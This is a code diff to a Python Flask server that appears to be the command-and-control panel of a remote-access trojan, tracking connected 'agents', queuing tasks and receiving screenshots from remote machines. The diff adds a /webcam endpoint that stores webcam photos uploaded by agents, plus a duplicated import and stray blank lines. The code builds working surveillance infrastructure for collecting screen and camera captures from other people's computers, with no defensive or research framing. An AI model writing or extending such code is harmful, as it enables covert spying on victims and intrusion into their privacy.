@@ -9,6 +9,9 @@ from PIL import Image, ImageTk
 import os as oos
 
 
+import os as oos
+
+
 log_queue = queue.Queue()
 image_queue = queue.Queue()
 agent_windows = {}
@@ -43,6 +46,8 @@ class Connections:
             return None
 
         return self.task_queue.pop(0)
+    
+    
         
     
     
@@ -388,6 +393,7 @@ def screenshot():
     log(f"    > Frame received from {request.remote_addr}")
     return "OK"
 
+
 def handling_inactive_connections(connections):
     while True:
         for con in connections:
@@ -395,7 +401,18 @@ def handling_inactive_connections(connections):
             else: con.status = "online"
         time.sleep(OFFLINE_CHECK_PERIOD)
         
-  
+
+@app.route("/webcam", methods=["POST"])
+def receive_webcam():
+    agent_id = request.form.get("id")
+    file = request.files.get("file")
+    if not file or not agent_id:
+        return jsonify({"error": "missing data"}), 400
+    oos.makedirs("webcams", exist_ok=True)
+    file.save(f"webcams/{agent_id}:{time.time()}.png")
+    log(f"    -> Webcam photo received from {request.remote_addr}")
+    return "OK"          
+    
 
 def run_server():
     app.run(host="0.0.0.0", debug=True, use_reloader=False)
